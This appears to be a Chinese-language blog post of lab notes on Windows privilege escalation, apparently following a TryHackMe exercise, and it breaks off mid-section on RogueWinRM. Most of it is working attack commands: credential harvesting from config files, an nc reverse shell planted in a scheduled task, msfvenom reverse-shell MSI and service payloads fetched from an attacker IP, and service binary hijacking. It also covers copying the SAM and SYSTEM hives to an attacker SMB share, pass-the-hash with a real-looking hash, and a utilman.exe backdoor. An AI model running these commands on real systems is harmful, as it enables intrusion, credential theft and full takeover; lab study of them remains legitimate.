<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 权限提升</span><br><span class="line"></span><br><span class="line">### 思路表</span><br><span class="line"></span><br><span class="line">1. 搜集密码，拿密码开</span><br><span class="line">   1. 无人值守的Windows安装</span><br><span class="line">   2. powershell历史</span><br><span class="line">   3. 已保存的用户凭证</span><br><span class="line">   4. iis配置</span><br><span class="line">   5. putty，</span><br><span class="line">      - 查注册表</span><br><span class="line">2. 计划任务提权</span><br><span class="line">   1. 查找可写计划任务写进去</span><br><span class="line">   2. AlwaysInstallElevated</span><br><span class="line">3. 服务配置滥用</span><br><span class="line">   1. 可修改服务指向文件</span><br><span class="line">   2. 未加引号的服务路径</span><br><span class="line">   3. 可修改服务配置</span><br><span class="line">4. 滥用危险特权</span><br><span class="line">   1. 可读取system+sam，拿脚本打</span><br><span class="line">   2. utilman.exe 锁屏界面的哪个小圈</span><br><span class="line">   3. 未打补丁的安全包</span><br><span class="line">      - 打漏洞</span><br><span class="line">   4. 其他需要放入工具使用</span><br><span class="line"></span><br><span class="line">**DACL**（**Discretionary Access Control List**）是 Windows 操作系统中用于控制对对象（如文件、文件夹、注册表项等）的访问权限的一种机制。它是访问控制列表（ACL，Access Control List）的一种类型。</span><br><span class="line"></span><br><span class="line">### 1密码搜集</span><br><span class="line"></span><br><span class="line">#### 无人值守的Windows安装</span><br><span class="line"></span><br><span class="line">单个操作系统映像部署到多个主机。这些类型的安装称为无人值守安装</span><br><span class="line"></span><br><span class="line">可能存在的位置</span><br><span class="line"></span><br><span class="line">C:\Unattend.xml</span><br><span class="line">C:\Windows\Panther\Unattend.xml</span><br><span class="line">C:\Windows\Panther\Unattend\Unattend.xml</span><br><span class="line">C:\Windows\system32\sysprep.inf</span><br><span class="line">C:\Windows\system32\sysprep\sysprep.xml</span><br><span class="line"></span><br><span class="line">#### powershell历史</span><br><span class="line"></span><br></pre></td></tr></table></figure>
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
上述命令只能在 cmd.exe 中运行
因为 Powershell 不会将其识别%userprofile%为环境变量。要从 Powershell 读取文件，您必须将其替换%userprofile%为$Env:userprofile
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 已保存的用户凭证</span><br><span class="line"></span><br><span class="line">没有密码</span><br><span class="line"></span><br></pre></td></tr></table></figure>
cmdkey /list
runas /savecred /user:admin cmd.exe
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### IIS配置</span><br><span class="line"></span><br><span class="line">Internet 信息服务 (IIS) 是 Windows 安装中的默认 Web 服务器。IIS 上的网站配置存储在名为的文件中web.config</span><br><span class="line"></span><br></pre></td></tr></table></figure>
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

<p>快速查找<br>type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### PuTTY从软件中检索</span><br><span class="line"></span><br><span class="line">要检索存储的代理凭据，您可以使用以下命令在以下注册表项下搜索 ProxyPassword：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ &#x2F;f “Proxy” &#x2F;s</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">注意： Simon Tatham 是 PuTTY 的创建者（他的名字是路径的一部分），而不是我们要检索密码的用户名。运行上述命令后，存储的代理用户名也应该可见。</span><br><span class="line"></span><br><span class="line">### 2计划任务提权</span><br><span class="line"></span><br><span class="line">#### 法一</span><br><span class="line"></span><br><span class="line">- 列出计时任务</span><br><span class="line">  - schtasks</span><br><span class="line">- 检索服务详细信息</span><br><span class="line">  - schtasks /query /tn vulntask /fo list /v</span><br><span class="line">- **检查**可执行文件的**权限**，我们使用**icacls**</span><br><span class="line">  - icacls c:\tasks\schtask.bat</span><br><span class="line">- 将nc文件传入.bat</span><br><span class="line">  - echo c:\tools\nc64.exe -e cmd.exe 10.9.0.87 4444 &gt; C:\tasks\schtask.bat</span><br><span class="line">- 运行</span><br><span class="line">  - schtasks /run /tn vulntask</span><br><span class="line"></span><br><span class="line">#### AlwaysInstallElevated</span><br><span class="line"></span><br><span class="line">Windows安装程序文件（.msi文件）用于在系统上安装应用程序它们通常以启动它的用户的权限级别运行。但是，这些文件可以配置为从任何用户帐户（甚至是非特权帐户）以更高的权限运行。这可能允许我们生成以管理员权限运行的恶意 MSI 文件。</span><br><span class="line"></span><br><span class="line">#### 方法</span><br><span class="line"></span><br><span class="line">- 设置两个注册表</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>C:&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer<br>C:&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 用msf生成恶意.msi文件</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>msfvenom -p windows&#x2F;x64&#x2F;shell_reverse_tcp LHOST&#x3D;10.9.0.87 LPORT&#x3D;4444 -f msi -o malicious.msi</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 安装程序并监听</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>msiexec &#x2F;quiet &#x2F;qn &#x2F;i C:\Windows\Temp\malicious.msi</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 3服务配置滥用</span><br><span class="line"></span><br><span class="line">#### Windows服务</span><br><span class="line"></span><br><span class="line">Windows 服务由服务控制管理器(SCM)管理</span><br><span class="line"></span><br><span class="line">Windows 计算机上的每项服务都会有一个关联的可执行文件，每当服务启动时，SCM 都会运行该可执行文件。需要注意的是，服务可执行文件会实现特殊功能以便能够与 SCM 通信，因此并非任何可执行文件都可以作为服务成功启动。每项服务还指定了服务将在其下运行的用户帐户。</span><br><span class="line"></span><br><span class="line">- sc qc命令检查 apphostsvc 服务配置</span><br><span class="line"></span><br><span class="line">关联的可执行文件是通过BINARY_PATH_NAME参数指定的，而用于运行该服务的账户则显示在SERVICE_START_NAME参数上。</span><br><span class="line"></span><br><span class="line">服务具有自主访问控制列表 (DACL)，它指示谁有权限启动、停止、暂停、查询状态、查询配置或重新配置服务以及其他特权。 DACL 可以从 Process Hacker（位于您计算机的桌面上）中看到</span><br><span class="line"></span><br><span class="line">- Process Hacker程序</span><br><span class="line">  - 可以查看指示的谁有权限启动、停止、暂停、查询状态、查询配置或重新配置服务以及其他特权。</span><br><span class="line">- HKLM\SYSTEM\CurrentControlSet\Services\</span><br><span class="line">  - 所有服务都存储在注册表中</span><br><span class="line">  - 系统中每个服务都有一个子项。同样，我们可以在ImagePath值上看到关联的可执行文件，在ObjectName值上看到用于启动服务的帐户。如果为服务配置了DACL ，它将存储在名为Security 的子项中。</span><br><span class="line">  - 默认情况只有管理员才能修改注册表</span><br><span class="line"></span><br><span class="line">#### 服务可执行文件权限不安全</span><br><span class="line"></span><br><span class="line">检查服务</span><br><span class="line"></span><br><span class="line">- sc qc WindowsScheduler</span><br><span class="line"></span><br><span class="line">查看权限</span><br><span class="line"></span><br><span class="line">- icacls C:\PROGRA~2\SYSTEM~1\WService.exe</span><br><span class="line"></span><br><span class="line">生成码+开服务+监听</span><br><span class="line"></span><br><span class="line">- msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe</span><br><span class="line">- python3 -m http.server 8080</span><br><span class="line"></span><br><span class="line">受害机执行powershell</span><br><span class="line"></span><br><span class="line">- wget http://10.9.0.87:8080/rev-svc.exe -O rev-svc.exe</span><br><span class="line"></span><br><span class="line">受害机上挪</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>cd C:\PROGRA<del>2\SYSTEM</del>1\</p>
<p>move WService.exe WService.exe.bkp<br>把原来的服务挪掉</p>
<p>move C:\Users\thm-unpriv\rev-svc.exe WService.exe<br>替换</p>
<p>icacls WService.exe &#x2F;grant Everyone:F<br>向Everyone组授予权限</p>
<p>重启服务在正常情况下，您可能需要等待服务重新启动，但您已被分配权限自行重新启动服务以节省一些时间。从 cmd.exe 命令提示符中使用以下命令：<br>C:&gt; sc stop windowsscheduler<br>C:&gt; sc start windowsscheduler</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 未加引号的服务路径</span><br><span class="line"></span><br><span class="line">sc qc &quot;disk sorter enterprise&quot;</span><br><span class="line"></span><br><span class="line">“”就是这个双引号</span><br><span class="line"></span><br><span class="line">使用 Windows 服务时，如果将服务配置为指向“未加引号”的可执行文件，则会出现一种非常特殊的行为。</span><br><span class="line"></span><br><span class="line">例如</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p> BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1. 首先，搜索C:\\MyPrograms\\Disk.exe。如果存在，服务将运行该可执行文件。</span><br><span class="line">2. 如果后者不存在，则将搜索C:\\MyPrograms\\Disk Sorter.exe。如果存在，服务将运行该可执行文件。</span><br><span class="line">3. 如果后者不存在，它将搜索C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe。此选项预计会成功，并且通常会在默认安装中运行。</span><br><span class="line"></span><br><span class="line">大多数服务可执行文件将默认安装在C:\Program Files或C:\Program Files (x86)下，非特权用户无法写入。这可以防止任何易受攻击的服务被利用。此规则有例外：- 某些安装程序会更改已安装文件夹的权限，从而使服务易受攻击。- 管理员可能会决定将服务二进制文件安装在非默认路径中。如果这样的路径是所有人均可写的，则可以利用该漏洞。</span><br><span class="line"></span><br><span class="line">##### 做法</span><br><span class="line"></span><br><span class="line">查看文件夹权限</span><br><span class="line"></span><br><span class="line">- icacls c:\MyPrograms</span><br><span class="line"></span><br><span class="line">move C:\PROGRA~2\SYSTEM~1\WService.exe C:\MyPrograms\Disk.exe</span><br><span class="line"></span><br><span class="line">向上边一样生成exe码然后wget进来然后</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>C:&gt; move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe<br>挪地方<br>C:&gt; icacls C:\MyPrograms\Disk.exe &#x2F;grant Everyone:F<br>开权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">重启服务去运行，kali监听即可</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>C:&gt; sc stop “disk sorter enterprise”<br>C:&gt; sc start “disk sorter enterprise”</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 不安全服务权限</span><br><span class="line"></span><br><span class="line">如果服务 DACL（不是服务的可执行DACL）允许您修改服务的配置，您将能够重新配置该服务。这将允许您指向您需要的任何可执行文件，并使用您喜欢的任何帐户运行它，包括 SYSTEM 本身。</span><br><span class="line"></span><br><span class="line">##### 检查DACL</span><br><span class="line"></span><br><span class="line">可以使用Sysinternals套件中的Accesschlk</span><br><span class="line"></span><br><span class="line">C:\tools\AccessChk&gt; accesschk64.exe -qlc thmservice</span><br><span class="line"></span><br><span class="line">![image-20250108152750435](https://github.com/DDL08/images/blob/img/img/image-20250108152750435.png?raw=true?raw=true)</span><br><span class="line"></span><br><span class="line">意味着任何用户都可以重新配置该服务</span><br><span class="line"></span><br><span class="line">##### 上码监听</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>wget <a target="_blank" rel="noopener" href="http://10.9.0.87:8080/rev-svc.exe">http://10.9.0.87:8080/rev-svc.exe</a> -O rev-svc.exe</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">授予所有人权限</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>C:&gt; icacls C:\Users\thm-unpriv\rev-svc3.exe &#x2F;grant Everyone:F</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">修改服务的关联可执行账户</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>C:&gt; sc config THMService binPath&#x3D; “C:\Users\thm-unpriv\rev-svc3.exe” obj&#x3D; LocalSystem</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">服务重新启动</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>C:&gt; sc stop THMService<br>C:&gt; sc start THMService</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 4滥用危险特权</span><br><span class="line"></span><br><span class="line">####  SeBackup/SeRestore</span><br><span class="line"></span><br><span class="line">这没实现成功，脚本没找到</span><br><span class="line"></span><br><span class="line">SeBackup 和 SeRestore 权限允许用户读取和写入系统中的任何文件，而忽略任何现有的DACL。</span><br><span class="line"></span><br><span class="line">查看权限</span><br><span class="line"></span><br><span class="line">- whoami /priv</span><br><span class="line"></span><br><span class="line">备份sam和system的hash</span><br><span class="line"></span><br><span class="line">从注册表中读取，</span><br><span class="line"></span><br><span class="line">- reg save hklm\system C:\Users\THMBackup\system.hive</span><br><span class="line">- reg save hklm\sam C:\Users\THMBackup\sam.hive </span><br><span class="line"></span><br><span class="line">在kaili上开启共享文件夹服务，代码如下smbserver.py，放下边了</span><br><span class="line"></span><br><span class="line">- user@attackerpc**$** mkdir share </span><br><span class="line">- user@attackerpc**$** python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share</span><br><span class="line"></span><br><span class="line">然后开始传过去</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>copy C:\Users\THMBackup\sam.hive \ATTACKER_IP\public<br>copy C:\Users\THMBackup\system.hive \10.9.0.87\public\</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">然后在hashdump下来</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>python3.9 &#x2F;opt&#x2F;impacket&#x2F;examples&#x2F;secretsdump.py -sam sam.hive -system system.hive LOCAL<br>Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">那个dump的脚本下来用不了，环境有问题</span><br><span class="line"></span><br><span class="line">然后用管理员的hash传递进行攻击</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>python3.9 &#x2F;opt&#x2F;impacket&#x2F;examples&#x2F;psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 <a href="mailto:&#x61;&#100;&#x6d;&#x69;&#x6e;&#105;&#115;&#116;&#x72;&#x61;&#x74;&#111;&#114;&#x40;&#x31;&#48;&#46;&#49;&#48;&#x2e;&#49;&#50;&#56;&#x2e;&#x35;&#54;">&#x61;&#100;&#x6d;&#x69;&#x6e;&#105;&#115;&#116;&#x72;&#x61;&#x74;&#111;&#114;&#x40;&#x31;&#48;&#46;&#49;&#48;&#x2e;&#49;&#50;&#56;&#x2e;&#x35;&#54;</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<p>#!&#x2F;usr&#x2F;bin&#x2F;env python<br>#smbserver.py</p>
<h1 id="Impacket-Collection-of-Python-classes-for-working-with-network-protocols"><a href="#Impacket-Collection-of-Python-classes-for-working-with-network-protocols" class="headerlink" title="Impacket - Collection of Python classes for working with network protocols."></a>Impacket - Collection of Python classes for working with network protocols.</h1><h1 id="-2"><a href="#-2" class="headerlink" title=""></a></h1><h1 id="Copyright-C-2022-Fortra-All-rights-reserved"><a href="#Copyright-C-2022-Fortra-All-rights-reserved" class="headerlink" title="Copyright (C) 2022 Fortra. All rights reserved."></a>Copyright (C) 2022 Fortra. All rights reserved.</h1><h1 id="-3"><a href="#-3" class="headerlink" title=""></a></h1><h1 id="This-software-is-provided-under-a-slightly-modified-version"><a href="#This-software-is-provided-under-a-slightly-modified-version" class="headerlink" title="This software is provided under a slightly modified version"></a>This software is provided under a slightly modified version</h1><h1 id="of-the-Apache-Software-License-See-the-accompanying-LICENSE-file"><a href="#of-the-Apache-Software-License-See-the-accompanying-LICENSE-file" class="headerlink" title="of the Apache Software License. See the accompanying LICENSE file"></a>of the Apache Software License. See the accompanying LICENSE file</h1><h1 id="for-more-information"><a href="#for-more-information" class="headerlink" title="for more information."></a>for more information.</h1><h1 id="-4"><a href="#-4" class="headerlink" title=""></a></h1><h1 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h1><h1 id="Simple-SMB-Server-example"><a href="#Simple-SMB-Server-example" class="headerlink" title="Simple SMB Server example."></a>Simple SMB Server example.</h1><h1 id="-5"><a href="#-5" class="headerlink" title=""></a></h1><h1 id="Author"><a href="#Author" class="headerlink" title="Author:"></a>Author:</h1><h1 id="Alberto-Solino-agsolino"><a href="#Alberto-Solino-agsolino" class="headerlink" title="Alberto Solino (@agsolino)"></a>Alberto Solino (@agsolino)</h1><h1 id="-6"><a href="#-6" class="headerlink" title=""></a></h1><p>import sys<br>import argparse<br>import logging</p>
<p>from impacket.examples import logger<br>from impacket import smbserver, version<br>from impacket.ntlm import compute_lmhash, compute_nthash</p>
<p>if <strong>name</strong> &#x3D;&#x3D; ‘<strong>main</strong>‘:</p>
<pre><code># Init the example&#39;s logger theme
print(version.BANNER)

parser = argparse.ArgumentParser(add_help = True, description = &quot;This script will launch a SMB Server and add a &quot;
                                 &quot;share specified as an argument. You need to be root in order to bind to port 445. &quot;
                                 &quot;For optional authentication, it is possible to specify username and password or the NTLM hash. &quot;
                                 &quot;Example: smbserver.py -comment &#39;My share&#39; TMP /tmp&quot;)

parser.add_argument(&#39;shareName&#39;, action=&#39;store&#39;, help=&#39;name of the share to add&#39;)
parser.add_argument(&#39;sharePath&#39;, action=&#39;store&#39;, help=&#39;path of the share to add&#39;)
parser.add_argument(&#39;-comment&#39;, action=&#39;store&#39;, help=&#39;share\&#39;s comment to display when asked for shares&#39;)
parser.add_argument(&#39;-username&#39;, action=&quot;store&quot;, help=&#39;Username to authenticate clients&#39;)
parser.add_argument(&#39;-password&#39;, action=&quot;store&quot;, help=&#39;Password for the Username&#39;)
parser.add_argument(&#39;-hashes&#39;, action=&quot;store&quot;, metavar = &quot;LMHASH:NTHASH&quot;, help=&#39;NTLM hashes for the Username, format is LMHASH:NTHASH&#39;)
parser.add_argument(&#39;-ts&#39;, action=&#39;store_true&#39;, help=&#39;Adds timestamp to every logging output&#39;)
parser.add_argument(&#39;-debug&#39;, action=&#39;store_true&#39;, help=&#39;Turn DEBUG output ON&#39;)
parser.add_argument(&#39;-ip&#39;, &#39;--interface-address&#39;, action=&#39;store&#39;, default=&#39;0.0.0.0&#39;, help=&#39;ip address of listening interface&#39;)
parser.add_argument(&#39;-port&#39;, action=&#39;store&#39;, default=&#39;445&#39;, help=&#39;TCP port for listening incoming connections (default 445)&#39;)
parser.add_argument(&#39;-smb2support&#39;, action=&#39;store_true&#39;, default=False, help=&#39;SMB2 Support (experimental!)&#39;)

if len(sys.argv)==1:
    parser.print_help()
    sys.exit(1)

try:
   options = parser.parse_args()
except Exception as e:
   logging.critical(str(e))
   sys.exit(1)

logger.init(options.ts)

if options.debug is True:
    logging.getLogger().setLevel(logging.DEBUG)
    # Print the Library&#39;s installation path
    logging.debug(version.getInstallationPath())
else:
    logging.getLogger().setLevel(logging.INFO)

if options.comment is None:
    comment = &#39;&#39;
else:
    comment = options.comment

server = smbserver.SimpleSMBServer(listenAddress=options.interface_address, listenPort=int(options.port))

server.addShare(options.shareName.upper(), options.sharePath, comment)
server.setSMB2Support(options.smb2support)

# If a user was specified, let&#39;s add it to the credentials for the SMBServer. If no user is specified, anonymous
# connections will be allowed
if options.username is not None:
    # we either need a password or hashes, if not, ask
    if options.password is None and options.hashes is None:
        from getpass import getpass
        password = getpass(&quot;Password:&quot;)
        # Let&#39;s convert to hashes
        lmhash = compute_lmhash(password)
        nthash = compute_nthash(password)
    elif options.password is not None:
        lmhash = compute_lmhash(options.password)
        nthash = compute_nthash(options.password)
    else:
        lmhash, nthash = options.hashes.split(&#39;:&#39;)

    server.addCredential(options.username, 0, lmhash, nthash)

# Here you can set a custom SMB challenge in hex format
# If empty defaults to &#39;4141414141414141&#39;
# (remember: must be 16 hex bytes long)
# e.g. server.setSMBChallenge(&#39;12345678abcdef00&#39;)
server.setSMBChallenge(&#39;&#39;)

# If you don&#39;t want log to stdout, comment the following line
# If you want log dumped to a file, enter the filename
server.setLogFile(&#39;&#39;)

# Rock and roll
server.start()
</code></pre>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### utilman.exe</span><br><span class="line"></span><br><span class="line">`utilman.exe`来提升权限</span><br><span class="line"></span><br><span class="line">Utilman 是一款内置 Windows 应用程序，用于在锁定屏幕期间提供轻松访问选项：</span><br><span class="line"></span><br><span class="line">先登录administrator权限</span><br><span class="line"></span><br><span class="line">获取utilman所有权</span><br><span class="line"></span><br><span class="line">- takeown /f C:\Windows\System32\Utilman.exe</span><br><span class="line"></span><br><span class="line">成为文件的所有者并不一定意味着您拥有该文件的权限，但作为所有者，您可以为自己分配所需的任何权限。要授予用户对 utilman.exe 的完全权限，您可以使用以下命令：</span><br><span class="line"></span><br><span class="line">- icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F</span><br><span class="line"></span><br><span class="line">替换utiilman</span><br><span class="line"></span><br><span class="line">- copy cmd.exe utilman.exe</span><br><span class="line"></span><br><span class="line">手动锁屏去访问，权限提升成功</span><br><span class="line"></span><br><span class="line">#### SeImpersonate/SeAssignPrimaryToken</span><br><span class="line"></span><br><span class="line">FTP服务器必须限制用户只能访问他们应该被允许查看的文件。</span><br><span class="line"></span><br><span class="line">FTP服务可以暂时获取登录用户的访问令牌，并使用它来代表他们执行任何任务：</span><br><span class="line"></span><br><span class="line">作为攻击者，如果我们设法控制具有 SeImpersonate 或 SeAssignPrimaryToken 权限的进程，我们就可以模仿任何连接和验证该进程的用户。</span><br><span class="line"></span><br><span class="line">在 Windows 系统中，您会发现 LOCAL SERVICE 和 NETWORK SERVICE ACCOUNTS 已经具有此类权限。由于这些帐户用于使用受限帐户生成服务，因此如果服务需要，允许它们模拟连接用户是有意义的。Internet 信息服务 (IIS) 还将为 Web 应用程序创建一个名为“iis apppool\defaultapppool”的类似默认帐户。</span><br><span class="line"></span><br><span class="line">要使用此类账户提升权限，攻击者需要执行以下操作：1. 生成一个进程，以便用户可以连接并对其进行身份验证，从而进行模拟。2. 找到一种方法来强制特权用户连接并验证生成的恶意进程。</span><br><span class="line"></span><br><span class="line">要使用 </span><br><span class="line"></span><br><span class="line">##### RogueWinRM工具</span><br><span class="line"></span><br><span class="line">，我们首先需要将漏洞上传到目标机器。</span><br><span class="line"></span><br><span class="line">原理</span><br><span class="line"></span><br></pre></td></tr></table></figure>
